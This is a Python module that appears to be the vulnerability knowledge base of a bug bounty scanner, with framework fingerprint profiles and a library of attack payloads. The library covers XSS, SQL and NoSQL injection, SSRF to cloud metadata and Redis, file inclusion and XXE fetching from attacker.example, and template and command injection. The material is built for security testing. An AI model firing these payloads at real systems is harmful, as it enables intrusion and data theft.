"""
knowledge_base.py
==================

Commercial-grade Vulnerability Knowledge Base for the AI Bug Bounty Recon &
Vulnerability Assessment Platform.

This module is the intelligence core of the scanner. Every other module
(vuln_engine, recon_core, finding_enricher, dashboard, pdf_generator,
attack_mapper, risk_scoring, exploit_generator) imports from here.

Architecture
------------
Vulnerability records are declared as compact raw dicts in _RAW_VULNERABILITIES
and materialised into full Vulnerability dataclass instances at import time.
Shared boilerplate fields are generated from category/severity templates.

The KnowledgeBase class maintains O(1) lookup indexes rebuilt automatically
on every register() call. All v1 public methods are preserved.

New in v2
---------
- PayloadRecord: structured payload metadata
- FrameworkProfile: per-framework intelligence
- BusinessRisk / ComplianceMapping: compliance coverage
- DetectionIntelligence / ExploitationIntelligence: richer metadata
- Automatic O(1) indexes (by_cwe, by_capec, by_owasp, by_category, by_tag,
  by_alias, by_severity, by_framework)
- Upgraded search() with partial/regex/fuzzy/field-targeted queries
- Upgraded statistics() with CVSS analytics, payload counts, coverage
- New helpers: best_payload(), frameworks(), top_critical(), top_by_cvss(),
  related(), similar(), search_payload(), search_reference(),
  payload_count(), framework_count()
- New exports: export_yaml(), export_markdown(), export_csv()
  Existing export_dict() / export_json() unchanged.
"""

from __future__ import annotations

import csv
import io
import json
import logging
import re
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

logger = logging.getLogger("knowledge_base")
logger.addHandler(logging.NullHandler())


# ======================================================================
# ENUMERATIONS  (unchanged from v1)
# ======================================================================


class Severity(Enum):
    """Qualitative severity rating aligned to CVSS v3.1 severity bands."""
    CRITICAL = "Critical"
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Informational"


class Category(Enum):
    """High-level vulnerability taxonomy."""
    INJECTION = "Injection"
    XSS = "Cross-Site Scripting"
    AUTH = "Authentication & Session Management"
    ACCESS_CONTROL = "Access Control"
    CRYPTO = "Cryptographic Issues"
    CONFIGURATION = "Security Misconfiguration"
    XXE = "XML External Entity"
    SSRF = "Server-Side Request Forgery"
    FILE_HANDLING = "File Handling"
    BUSINESS_LOGIC = "Business Logic Abuse"
    API_SECURITY = "API Security"
    INFO_DISCLOSURE = "Information Disclosure"
    CLIENT_SIDE = "Client-Side Security"
    CLOUD = "Cloud & Infrastructure Exposure"
    SUPPLY_CHAIN = "Supply Chain & Dependency"
    NETWORK_SERVICE = "Network Service Exposure"
    DESERIALIZATION = "Insecure Deserialization"


class Exploitability(Enum):
    """How easily a finding can be weaponised."""
    TRIVIAL = "Trivial"
    EASY = "Easy"
    MODERATE = "Moderate"
    DIFFICULT = "Difficult"
    THEORETICAL = "Theoretical"


class AttackVector(Enum):
    """CVSS-aligned attack vector classification."""
    NETWORK = "Network"
    ADJACENT = "Adjacent Network"
    LOCAL = "Local"
    PHYSICAL = "Physical"


# ======================================================================
# v2 DATA STRUCTURES
# ======================================================================


@dataclass(slots=True)
class PayloadRecord:
    """Structured payload entry with full metadata for scanner decision-making."""
    payload: str
    difficulty: str = "Easy"
    context: str = "generic"
    encoding: str = "none"
    bypass: list[str] = field(default_factory=list)
    supported_frameworks: list[str] = field(default_factory=list)
    confidence: str = "High"
    notes: str = ""


@dataclass(slots=True)
class ComplianceMapping:
    """Compliance framework coverage for a vulnerability class."""
    pci_dss: list[str] = field(default_factory=list)
    soc2: list[str] = field(default_factory=list)
    iso27001: list[str] = field(default_factory=list)
    hipaa: list[str] = field(default_factory=list)
    gdpr: list[str] = field(default_factory=list)
    owasp_asvs: list[str] = field(default_factory=list)


@dataclass(slots=True)
class BusinessRisk:
    """Extended business risk metadata for executive reporting."""
    affected_assets: list[str] = field(default_factory=list)
    business_risk: str = ""
    likelihood: str = "Medium"
    attacker_value: str = "Medium"
    compliance_mapping: ComplianceMapping = field(default_factory=ComplianceMapping)


@dataclass(slots=True)
class DetectionIntelligence:
    """Structured detection metadata consumed by vuln_engine and recon_core."""
    positive_indicators: list[str] = field(default_factory=list)
    negative_indicators: list[str] = field(default_factory=list)
    validation_steps: list[str] = field(default_factory=list)
    manual_verification: str = ""
    common_false_positives: list[str] = field(default_factory=list)
    required_conditions: list[str] = field(default_factory=list)


@dataclass(slots=True)
class ExploitationIntelligence:
    """Exploitation metadata consumed by exploit_generator and risk_scoring."""
    difficulty: str = "Moderate"
    prerequisites: list[str] = field(default_factory=list)
    authentication_required: bool = False
    privilege_required: str = "None"
    user_interaction: bool = False
    exploit_chain: list[str] = field(default_factory=list)
    post_exploitation: list[str] = field(default_factory=list)


@dataclass(slots=True)
class FrameworkProfile:
    """Per-framework intelligence profile."""
    name: str
    common_vulnerabilities: list[str] = field(default_factory=list)
    recommendations: list[str] = field(default_factory=list)
    detection_hints: list[str] = field(default_factory=list)
    fingerprinting: list[str] = field(default_factory=list)
    common_files: list[str] = field(default_factory=list)
    default_endpoints: list[str] = field(default_factory=list)
    language: str = ""
    category: str = ""


# ======================================================================
# PRIMARY VULNERABILITY DATACLASS  (v1 fields preserved + v2 extensions)
# ======================================================================


@dataclass(slots=True)
class Vulnerability:
    """Canonical, fully-populated record describing one finding type."""

    # v1 core fields (unchanged)
    id: str
    title: str
    aliases: list[str]
    category: Category
    severity: Severity
    cvss: float
    cvss_vector: str
    cwe: str
    owasp: str
    capec: str
    attack_vector: AttackVector
    description: str
    impact: str
    recommendation: str
    references: list[str]
    payloads: list[str]
    tags: list[str]
    confidence: str
    exploitability: Exploitability
    framework_notes: str
    business_impact: str
    false_positive_notes: str
    detection_notes: str
    related_vulnerabilities: list[str] = field(default_factory=list)

    # v2 extension fields
    rich_payloads: list[PayloadRecord] = field(default_factory=list)
    affected_frameworks: list[str] = field(default_factory=list)
    business_risk: BusinessRisk = field(default_factory=BusinessRisk)
    detection_intel: DetectionIntelligence = field(default_factory=DetectionIntelligence)
    exploit_intel: ExploitationIntelligence = field(default_factory=ExploitationIntelligence)
    compliance: ComplianceMapping = field(default_factory=ComplianceMapping)
    remediation_effort: str = "Medium"
    cvss_temporal: float = 0.0
    cvss_environmental: float = 0.0

    def summary(self) -> str:
        """Return a one-line human-readable summary (v1 compatible)."""
        return f"[{self.severity.value}] {self.title} (CVSS {self.cvss}, {self.cwe})"

    def to_dict(self) -> dict[str, Any]:
        """Return a plain-dict representation including all v2 fields."""
        return {
            "id": self.id,
            "title": self.title,
            "aliases": self.aliases,
            "category": self.category.value,
            "severity": self.severity.value,
            "cvss": self.cvss,
            "cvss_vector": self.cvss_vector,
            "cvss_temporal": self.cvss_temporal,
            "cvss_environmental": self.cvss_environmental,
            "cwe": self.cwe,
            "owasp": self.owasp,
            "capec": self.capec,
            "attack_vector": self.attack_vector.value,
            "description": self.description,
            "impact": self.impact,
            "recommendation": self.recommendation,
            "references": self.references,
            "payloads": self.payloads,
            "rich_payloads": [
                {
                    "payload": p.payload, "difficulty": p.difficulty,
                    "context": p.context, "encoding": p.encoding,
                    "bypass": p.bypass,
                    "supported_frameworks": p.supported_frameworks,
                    "confidence": p.confidence, "notes": p.notes,
                }
                for p in self.rich_payloads
            ],
            "tags": self.tags,
            "confidence": self.confidence,
            "exploitability": self.exploitability.value,
            "framework_notes": self.framework_notes,
            "business_impact": self.business_impact,
            "false_positive_notes": self.false_positive_notes,
            "detection_notes": self.detection_notes,
            "related_vulnerabilities": self.related_vulnerabilities,
            "affected_frameworks": self.affected_frameworks,
            "remediation_effort": self.remediation_effort,
            "business_risk": {
                "affected_assets": self.business_risk.affected_assets,
                "business_risk": self.business_risk.business_risk,
                "likelihood": self.business_risk.likelihood,
                "attacker_value": self.business_risk.attacker_value,
            },
            "compliance": {
                "pci_dss": self.compliance.pci_dss,
                "soc2": self.compliance.soc2,
                "iso27001": self.compliance.iso27001,
                "hipaa": self.compliance.hipaa,
                "gdpr": self.compliance.gdpr,
                "owasp_asvs": self.compliance.owasp_asvs,
            },
            "detection_intel": {
                "positive_indicators": self.detection_intel.positive_indicators,
                "negative_indicators": self.detection_intel.negative_indicators,
                "validation_steps": self.detection_intel.validation_steps,
                "manual_verification": self.detection_intel.manual_verification,
                "common_false_positives": self.detection_intel.common_false_positives,
                "required_conditions": self.detection_intel.required_conditions,
            },
            "exploit_intel": {
                "difficulty": self.exploit_intel.difficulty,
                "prerequisites": self.exploit_intel.prerequisites,
                "authentication_required": self.exploit_intel.authentication_required,
                "privilege_required": self.exploit_intel.privilege_required,
                "user_interaction": self.exploit_intel.user_interaction,
                "exploit_chain": self.exploit_intel.exploit_chain,
                "post_exploitation": self.exploit_intel.post_exploitation,
            },
        }

# ======================================================================
# SHARED PAYLOAD LIBRARY  (v1 unchanged)
# ======================================================================

PAYLOAD_LIBRARY: dict[str, list[str]] = {
    "xss": [
        "<script>alert(document.domain)</script>",
        "\"><svg onload=alert(1)>",
        "<img src=x onerror=alert(document.cookie)>",
        "javascript:alert(1)//",
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    "sqli": [
        "' OR '1'='1' -- -",
        "\" OR \"1\"=\"1\" -- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)-- -",
        "1' ORDER BY 10-- -",
        "' OR 1=1 LIMIT 1-- -",
    ],
    "nosqli": [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"username": {"$regex": "^admin"}}',
        "';return true;var x='",
        '{"$where": "sleep(5000)"}',
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:6379/",
        "http://localhost:22",
        "http://[::1]:80/",
        "http://internal-service.local/admin",
        "gopher://127.0.0.1:6379/_%0d%0aFLUSHALL%0d%0a",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/var/log/apache2/access.log",
        "....//....//....//etc/passwd",
    ],
    "rfi": [
        "http://attacker.example/shell.txt",
        "\\\\attacker.example\\share\\shell.php",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "<%= 7 * 7 %>",
    ],
    "open_redirect": [
        "https://target.tld/login?next=https://attacker.example",
        "//attacker.example",
        "/\\attacker.example",
        "https://target.tld.attacker.example",
    ],
    "header_injection": [
        "test%0d%0aSet-Cookie:%20session=hijacked",
        "test\r\nX-Injected: true",
        "test%0aLocation:%20https://attacker.example",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/evil.dtd">%p;]>',
    ],
    "command_injection": [
        "; id",
        "| whoami",
        "`id`",
        "$(id)",
        "&& ping -c 3 attacker.example",
    ],
    "code_injection": [
        "__import__('os').system('id')",
        "eval(\"__import__('os').system('id')\")",
    ],
    "ldap": [
        "*)(uid=*))(|(uid=*",
        "admin)(&)",
        "*)(|(password=*))",
    ],
    "xpath": [
        "' or '1'='1",
        "'] | //user/*[contains(*,'",
    ],
    "crlf": [
        "%0d%0aSet-Cookie:%20injected=1",
        "%0d%0aContent-Length:%200",
    ],
    "xml_injection": [
        "<user><name>admin</name><role>administrator</role></user>",
    ],
    "path_traversal_zip": [
        "../../../../tmp/evil.sh",
    ],
    "http_smuggling": [
        "Transfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin HTTP/1.1",
    ],
    "hpp": [
        "?role=user&role=admin",
        "?price=100&price=1",
    ],
    "jsonp": [
        "/api/user?callback=attackerControlled",
    ],
    "prototype_pollution": [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
    ],
}


def _build_rich_payloads(key: Optional[str]) -> list[PayloadRecord]:
    """Convert raw payload strings into structured PayloadRecord objects."""
    if key is None:
        return []
    raw = PAYLOAD_LIBRARY.get(key, [])
    _ctx: dict[str, tuple[str, str]] = {
        "xss": ("html", "Easy"), "sqli": ("generic", "Easy"),
        "nosqli": ("json", "Easy"), "ssrf": ("url", "Moderate"),
        "lfi": ("url", "Easy"), "rfi": ("url", "Easy"),
        "ssti": ("generic", "Moderate"), "open_redirect": ("url", "Easy"),
        "header_injection": ("header", "Easy"), "xxe": ("xml", "Moderate"),
        "command_injection": ("shell", "Easy"), "code_injection": ("generic", "Easy"),
        "ldap": ("generic", "Moderate"), "xpath": ("generic", "Moderate"),
        "crlf": ("header", "Easy"), "xml_injection": ("xml", "Moderate"),
        "path_traversal_zip": ("url", "Easy"),
        "http_smuggling": ("header", "Difficult"),
        "hpp": ("url", "Easy"), "jsonp": ("url", "Easy"),
        "prototype_pollution": ("json", "Moderate"),
    }
    ctx, diff = _ctx.get(key, ("generic", "Moderate"))
    return [
        PayloadRecord(payload=p, difficulty=diff, context=ctx,
                      encoding="none", bypass=[], supported_frameworks=[],
                      confidence="High", notes="")
        for p in raw
    ]


def _payloads(key: Optional[str]) -> list[str]:
    """Resolve a payload library key to a fresh list copy (v1 compat)."""
    if key is None:
        return []
    return list(PAYLOAD_LIBRARY.get(key, []))


# ======================================================================
# FRAMEWORK INTELLIGENCE PROFILES
# ======================================================================

_FRAMEWORK_PROFILES: dict[str, FrameworkProfile] = {
    "Laravel": FrameworkProfile(
        name="Laravel", language="PHP", category="web-framework",
        common_vulnerabilities=["SQLI-001", "XSS-001", "SSTI-001", "CSRF-001", "MASSASSIGN-001", "LFI-001"],
        recommendations=[
            "Use Eloquent ORM parameterised queries exclusively.",
            "Enable CSRF middleware (VerifyCsrfToken) on all state-changing routes.",
            "Disable debug mode (APP_DEBUG=false) in production.",
            "Validate all inputs with Laravel's Form Request Validation.",
        ],
        detection_hints=[
            "X-Powered-By: PHP response header",
            "Set-Cookie header containing laravel_session",
            "XSRF-TOKEN cookie present",
            "HTTP 419 status code (CSRF mismatch)",
        ],
        fingerprinting=[
            "Cookie: laravel_session=", "X-XSRF-TOKEN header",
            "/public/index.php entry point", "bootstrap/app.php", "artisan console",
        ],
        common_files=["/public/index.php", "/.env", "/storage/logs/laravel.log", "/config/app.php"],
        default_endpoints=["/api/user", "/login", "/register", "/password/reset", "/home"],
    ),
    "Symfony": FrameworkProfile(
        name="Symfony", language="PHP", category="web-framework",
        common_vulnerabilities=["SQLI-001", "XSS-001", "SSTI-001", "DESER-002", "CSRF-001"],
        recommendations=[
            "Use Doctrine ORM with parameterised DQL/query builder.",
            "Enable Symfony CSRF component for all forms.",
            "Restrict production access to /app_dev.php.",
            "Audit Twig template inheritance for SSTI sinks.",
        ],
        detection_hints=[
            "Symfony exception page (purple/black) visible in error",
            "/_profiler/ endpoint reachable",
            "/app_dev.php front controller accessible",
        ],
        fingerprinting=["PHPSESSID cookie", "symfony_state cookie", "app_dev.php", "/_wdt/ web debug toolbar"],
        common_files=["/.env", "/config/packages/", "/var/cache/", "app/config/parameters.yml"],
        default_endpoints=["/_profiler", "/_wdt", "/app_dev.php"],
    ),
    "CodeIgniter": FrameworkProfile(
        name="CodeIgniter", language="PHP", category="web-framework",
        common_vulnerabilities=["SQLI-001", "XSS-001", "CSRF-001", "UPLOAD-001"],
        recommendations=["Use Query Builder class to avoid raw SQL.", "Enable CSRF protection in config.php.", "Disable directory listing."],
        detection_hints=["ci_session cookie", "CodeIgniter error pages", "/index.php/ URL pattern"],
        fingerprinting=["ci_session", "/system/core/", "/index.php/"],
        common_files=["application/config/config.php", "application/config/database.php"],
        default_endpoints=["/index.php/", "/index.php/welcome/"],
    ),
    "Yii": FrameworkProfile(
        name="Yii", language="PHP", category="web-framework",
        common_vulnerabilities=["SQLI-001", "DESER-002", "XSS-001", "CSRF-001"],
        recommendations=["Use Yii's ActiveRecord query methods with parameterisation.", "Keep yii-csrf component enabled.", "Upgrade to Yii2 if still on Yii1."],
        detection_hints=["PHPSESSID + YII_CSRF_TOKEN cookies", "Yii application exception pages"],
        fingerprinting=["YII_CSRF_TOKEN", "/assets/ Yii asset manager paths"],
        common_files=["config/main.php", "config/db.php"],
        default_endpoints=["/index.php", "/site/login", "/site/index"],
    ),
    "Django": FrameworkProfile(
        name="Django", language="Python", category="web-framework",
        common_vulnerabilities=["SSTI-001", "SQLI-001", "CSRF-001", "MISCONF-001", "DEBUGEP-001"],
        recommendations=[
            "Set DEBUG=False in production; supply a non-empty ALLOWED_HOSTS.",
            "Use Django's ORM; avoid raw() with user-controlled SQL fragments.",
            "Enable django-csp and set a restrictive Content-Security-Policy.",
            "Rotate SECRET_KEY and never commit it to version control.",
        ],
        detection_hints=[
            "Yellow Django DEBUG page visible in error responses",
            "csrftoken cookie present",
            "Django version in Server or X-Powered-By header",
        ],
        fingerprinting=["csrftoken cookie", "sessionid cookie", "Set-Cookie: csrftoken=", "Django/N.N signature in headers"],
        common_files=["/admin/", "/static/admin/", "/manage.py", "/settings.py"],
        default_endpoints=["/admin/", "/admin/login/", "/api/", "/accounts/login/"],
    ),
    "Flask": FrameworkProfile(
        name="Flask", language="Python", category="web-framework",
        common_vulnerabilities=["SSTI-001", "DEBUGEP-001", "SQLI-001", "CORS-001", "INFODISC-001"],
        recommendations=[
            "Never run with debug=True in production.",
            "Set a strong, unique SECRET_KEY.",
            "Use flask-talisman for security headers.",
            "Validate all user input with wtforms or marshmallow.",
        ],
        detection_hints=["Werkzeug debugger page exposed", "Werkzeug/2.x Python server header", "Pin entry point visible in stack traces"],
        fingerprinting=["Server: Werkzeug", "session cookie with Werkzeug signature format", "/__debugger__/ endpoint", "console PIN prompt"],
        common_files=["app.py", "wsgi.py", "config.py", "requirements.txt"],
        default_endpoints=["/__debugger__/", "/console", "/api/"],
    ),
    "FastAPI": FrameworkProfile(
        name="FastAPI", language="Python", category="api",
        common_vulnerabilities=["BOLA-001", "CORS-001", "MASSASSIGN-001", "EXCESSDATA-001", "JWT-001"],
        recommendations=[
            "Enable strict CORS origins — never use allow_origins=['*'] with allow_credentials=True.",
            "Define explicit Pydantic response models to prevent field over-exposure.",
            "Enforce OAuth2 dependency injection on protected routers.",
        ],
        detection_hints=["/docs Swagger UI exposed in production", "/redoc endpoint accessible", "/openapi.json schema reachable unauthenticated"],
        fingerprinting=["/docs", "/redoc", "/openapi.json"],
        common_files=["main.py", "routers/", "schemas/", "models/"],
        default_endpoints=["/docs", "/redoc", "/openapi.json", "/health", "/api/v1/"],
    ),
    "Express": FrameworkProfile(
        name="Express", language="JavaScript/Node.js", category="web-framework",
        common_vulnerabilities=["SQLI-001", "SQLI-004", "PROTOPOLL-001", "XSS-001", "CORS-001", "DESER-001"],
        recommendations=[
            "Use helmet middleware to set secure HTTP headers.",
            "Sanitise user-controlled query parameters before passing to MongoDB.",
            "Validate and sanitise all body inputs with express-validator.",
            "Set NODE_ENV=production to suppress stack traces.",
        ],
        detection_hints=["X-Powered-By: Express header", "connect.sid cookie", "Node.js stack trace in error pages"],
        fingerprinting=["X-Powered-By: Express", "connect.sid cookie"],
        common_files=["package.json", "app.js", "server.js", ".env", "node_modules/"],
        default_endpoints=["/api/", "/graphql", "/health", "/metrics"],
    ),
    "NestJS": FrameworkProfile(
        name="NestJS", language="TypeScript/Node.js", category="web-framework",
        common_vulnerabilities=["BOLA-001", "MASSASSIGN-001", "CORS-001", "JWT-001", "EXCESSDATA-001"],
        recommendations=[
            "Use class-validator and class-transformer for all DTO validation.",
            "Apply @UseGuards(JwtAuthGuard) consistently on protected controllers.",
            "Use @Serialize() interceptor to prevent over-fetching in responses.",
        ],
        detection_hints=["Swagger UI at /api or /docs in dev mode", "NestJS-specific error format in responses"],
        fingerprinting=["X-Powered-By: Express", "/api swagger endpoint", "nest_jwt cookie"],
        common_files=["main.ts", "app.module.ts", ".env", "package.json"],
        default_endpoints=["/api", "/api/docs", "/health", "/metrics"],
    ),
    "Next.js": FrameworkProfile(
        name="Next.js", language="JavaScript/TypeScript", category="web-framework",
        common_vulnerabilities=["XSS-001", "SSRF-001", "INFODISC-001", "CORS-001", "REDIR-001"],
        recommendations=[
            "Restrict next.config.js rewrites/redirects to known trusted origins.",
            "Sanitise dynamic route segments before using as filesystem paths.",
            "Disable X-Powered-By header in production.",
        ],
        detection_hints=["X-Powered-By: Next.js header", "__NEXT_DATA__ global in page source", "/_next/static/ asset paths"],
        fingerprinting=["X-Powered-By: Next.js", "__NEXT_DATA__", "/_next/"],
        common_files=["next.config.js", "pages/api/", ".env.local", "public/"],
        default_endpoints=["/_next/", "/api/", "/__nextjs_original-stack-frame"],
    ),
    "React": FrameworkProfile(
        name="React", language="JavaScript/TypeScript", category="frontend",
        common_vulnerabilities=["XSS-003", "PROTOPOLL-001", "CORS-001", "REDIR-001"],
        recommendations=[
            "Avoid dangerouslySetInnerHTML with user-supplied data.",
            "Use DOMPurify for any scenario requiring HTML rendering.",
            "Validate postMessage origin in all message event handlers.",
        ],
        detection_hints=["React DevTools detectable in browser", "__reactFiber__ property on DOM nodes"],
        fingerprinting=["__REACT_DEVTOOLS_GLOBAL_HOOK__", "react.development.js"],
        common_files=["package.json", "src/App.jsx", "public/index.html", ".env"],
        default_endpoints=["/static/js/main.chunk.js", "/manifest.json"],
    ),
    "Vue": FrameworkProfile(
        name="Vue", language="JavaScript/TypeScript", category="frontend",
        common_vulnerabilities=["XSS-003", "PROTOPOLL-001", "CORS-001"],
        recommendations=["Never use v-html with untrusted user data.", "Use Content-Security-Policy to restrict inline script execution."],
        detection_hints=["__vue__ property on DOM elements", "Vue DevTools detected in browser"],
        fingerprinting=["__vue__", "vue.runtime.esm.js"],
        common_files=["package.json", "src/main.js", "vue.config.js", ".env"],
        default_endpoints=["/"],
    ),
    "Angular": FrameworkProfile(
        name="Angular", language="TypeScript", category="frontend",
        common_vulnerabilities=["XSS-003", "CORS-001", "CSRF-001"],
        recommendations=[
            "Avoid bypassing Angular's built-in sanitizer with DomSanitizer.bypassSecurityTrust* methods.",
            "Use HttpClientXsrfModule for CSRF protection on API calls.",
        ],
        detection_hints=["ng-version attribute on app element", "Zone.js in source"],
        fingerprinting=["ng-version", "zone.js", "angular.json"],
        common_files=["angular.json", "src/environments/environment.ts", "package.json"],
        default_endpoints=["/main.js", "/polyfills.js"],
    ),
    "Nuxt": FrameworkProfile(
        name="Nuxt", language="JavaScript/TypeScript", category="web-framework",
        common_vulnerabilities=["XSS-001", "SSRF-001", "INFODISC-001"],
        recommendations=["Sanitise server-side data before embedding into Nuxt state.", "Restrict serverMiddleware routes.", "Set server.timing=false in production."],
        detection_hints=["__NUXT__ global in page source", "/_nuxt/ asset paths"],
        fingerprinting=["__NUXT__", "/_nuxt/"],
        common_files=["nuxt.config.js", "server/api/", ".env"],
        default_endpoints=["/_nuxt/", "/api/", "/_server/"],
    ),
    "Spring": FrameworkProfile(
        name="Spring", language="Java", category="web-framework",
        common_vulnerabilities=["DESER-003", "SSRF-001", "SQLI-001"],
        recommendations=["Use Spring Security for unified authentication and authorization.", "Validate bean binding inputs with @Valid / @Validated."],
        detection_hints=["org.springframework exception class names", "DispatcherServlet in stack trace"],
        fingerprinting=["org.springframework", "spring-webmvc"],
        common_files=["applicationContext.xml", "dispatcher-servlet.xml"],
        default_endpoints=["/api/", "/ws/"],
    ),
    "Spring Boot": FrameworkProfile(
        name="Spring Boot", language="Java", category="web-framework",
        common_vulnerabilities=["DESER-003", "SSRF-001", "SQLI-001", "MISCONF-001", "INFODISC-001"],
        recommendations=[
            "Restrict Spring Boot Actuator endpoints to management port / authenticated access only.",
            "Disable the H2 console in production.",
            "Use parameterised queries with Spring Data JPA.",
        ],
        detection_hints=[
            "/actuator/health reachable without authentication",
            "/actuator/env leaks environment variables",
            "Whitelabel Error Page in stack traces",
        ],
        fingerprinting=["/actuator", "/actuator/info", "/actuator/health", "org.springframework in stack traces", "/h2-console"],
        common_files=["application.properties", "application.yml", "pom.xml", "build.gradle"],
        default_endpoints=["/actuator", "/actuator/health", "/actuator/env", "/h2-console", "/api/"],
    ),
    "ASP.NET": FrameworkProfile(
        name="ASP.NET", language="C#", category="web-framework",
        common_vulnerabilities=["DESER-004", "SQLI-001", "XSS-001", "CSRF-001", "INFODISC-001"],
        recommendations=[
            "Enable ValidateAntiForgeryToken on all POST endpoints.",
            "Use Entity Framework parameterised queries rather than raw SQL.",
            "Disable detailed error pages (customErrors mode='On') in production.",
        ],
        detection_hints=["ASP.NET_SessionId cookie", "__VIEWSTATE hidden form field present", "X-AspNet-Version / X-AspNetMvc-Version headers"],
        fingerprinting=["X-AspNet-Version", "X-Powered-By: ASP.NET", "__VIEWSTATE", "ASP.NET_SessionId"],
        common_files=["web.config", "Global.asax", "App_Code/", "bin/"],
        default_endpoints=["/elmah.axd", "/trace.axd", "/webresource.axd"],
    ),
    "Rails": FrameworkProfile(
        name="Rails", language="Ruby", category="web-framework",
        common_vulnerabilities=["SQLI-001", "MASSASSIGN-001", "SSTI-001", "DESER-001", "CSRF-001"],
        recommendations=[
            "Use strong parameter patterns (permit/require) in every controller action.",
            "Keep Rails and all gems up to date; subscribe to security mailing lists.",
            "Enable force_ssl in production environments.",
        ],
        detection_hints=["_session_id cookie", "X-Runtime header with fractional-second value"],
        fingerprinting=["X-Runtime", "_session_id cookie", "Set-Cookie: _csrf_token"],
        common_files=["Gemfile", "config/routes.rb", "config/database.yml", "config/secrets.yml"],
        default_endpoints=["/rails/info", "/rails/mailers", "/sidekiq"],
    ),
    "Phoenix": FrameworkProfile(
        name="Phoenix", language="Elixir", category="web-framework",
        common_vulnerabilities=["CSRF-001", "CORS-001", "INFODISC-001"],
        recommendations=["Use Ecto changesets for parameterised queries.", "Ensure LiveView socket authentication.", "Apply plug :protect_from_forgery on state-changing pipelines."],
        detection_hints=["Phoenix.LiveView websocket connection at /live/websocket", "_phoenix_session cookie"],
        fingerprinting=["_phoenix_session", "Phoenix.LiveView", "/socket/websocket"],
        common_files=["config/config.exs", "config/prod.exs", "priv/repo/"],
        default_endpoints=["/dashboard", "/_phoenix/live_reload", "/socket/websocket"],
    ),
    "Gin": FrameworkProfile(
        name="Gin", language="Go", category="web-framework",
        common_vulnerabilities=["CORS-001", "BOLA-001", "INFODISC-001"],
        recommendations=["Use gin-contrib/cors with explicit origin allowlist.", "Validate all path parameters before use."],
        detection_hints=["gin-gonic in source or build info", "/debug/pprof/ reachable"],
        fingerprinting=["/debug/pprof/"],
        common_files=["main.go", "go.mod"],
        default_endpoints=["/debug/pprof/", "/api/v1/", "/health"],
    ),
    "Echo": FrameworkProfile(
        name="Echo", language="Go", category="web-framework",
        common_vulnerabilities=["CORS-001", "BOLA-001"],
        recommendations=["Apply echo middleware.CORSWithConfig with explicit allow-origins.", "Use echo.Context.Bind() with validation."],
        detection_hints=["Echo framework stack traces in errors"],
        fingerprinting=["labstack/echo in build info"],
        common_files=["main.go", "go.sum"],
        default_endpoints=["/api/", "/health"],
    ),
    "Fiber": FrameworkProfile(
        name="Fiber", language="Go", category="web-framework",
        common_vulnerabilities=["CORS-001", "INFODISC-001"],
        recommendations=["Configure fiber cors middleware with explicit AllowOrigins.", "Use fiber.Map for typed response bodies."],
        detection_hints=["gofiber/fiber in build artifacts"],
        fingerprinting=["X-Powered-By: Fiber"],
        common_files=["main.go", "go.mod"],
        default_endpoints=["/api/", "/health", "/metrics"],
    ),
    "WordPress": FrameworkProfile(
        name="WordPress", language="PHP", category="cms",
        common_vulnerabilities=["SQLI-001", "XSS-001", "LFI-001", "UPLOAD-001", "INFODISC-001"],
        recommendations=[
            "Keep WordPress core, themes, and plugins updated.",
            "Disable file editing from the admin dashboard (DISALLOW_FILE_EDIT).",
            "Restrict xmlrpc.php access if not required.",
        ],
        detection_hints=["/wp-login.php present", "wp-content/ paths in page source", "WordPress generator meta tag"],
        fingerprinting=["/wp-login.php", "/wp-admin/", "wp-content/", "wordpress"],
        common_files=["/wp-config.php", "/wp-login.php", "/xmlrpc.php", "/.htaccess"],
        default_endpoints=["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/wp-json/"],
    ),
    "Drupal": FrameworkProfile(
        name="Drupal", language="PHP", category="cms",
        common_vulnerabilities=["SQLI-001", "XSS-001", "DESER-002", "INFODISC-001"],
        recommendations=["Apply Drupal security advisories promptly.", "Disable PHP filter module if not needed.", "Restrict access to /install.php, /update.php."],
        detection_hints=["Drupal.settings JS object in page source", "X-Generator: Drupal header"],
        fingerprinting=["X-Generator: Drupal", "SESS cookie prefix", "/sites/default/", "/misc/drupal.js"],
        common_files=["settings.php", "/sites/default/files/", "/core/install.php"],
        default_endpoints=["/user/login", "/admin/", "/update.php", "/install.php"],
    ),
    "Magento": FrameworkProfile(
        name="Magento", language="PHP", category="cms",
        common_vulnerabilities=["SQLI-001", "XSS-001", "LFI-001", "SSRF-001", "INFODISC-001"],
        recommendations=["Apply Magento security patches immediately.", "Restrict /downloader/ and /admin/ paths.", "Enable two-factor authentication for admin panel."],
        detection_hints=["Mage.Cookies.path in source", "/skin/frontend/ asset paths"],
        fingerprinting=["Mage.", "/skin/frontend/", "/media/catalog/", "form_key cookie"],
        common_files=["app/etc/local.xml", "app/etc/env.php", "/var/log/"],
        default_endpoints=["/admin/", "/downloader/", "/api/rest/", "/rest/V1/"],
    ),
    "Shopify": FrameworkProfile(
        name="Shopify", language="Liquid/Ruby", category="cms",
        common_vulnerabilities=["XSS-001", "OAUTH-001", "CORS-001", "WEBHOOK-001"],
        recommendations=["Verify Shopify HMAC on all webhook payloads.", "Use nonce validation in OAuth flows."],
        detection_hints=["Shopify.theme.* in page source", "myshopify.com domain"],
        fingerprinting=["myshopify.com", "Shopify.Checkout", "cdn.shopify.com"],
        common_files=["config/settings_schema.json", "templates/", "sections/"],
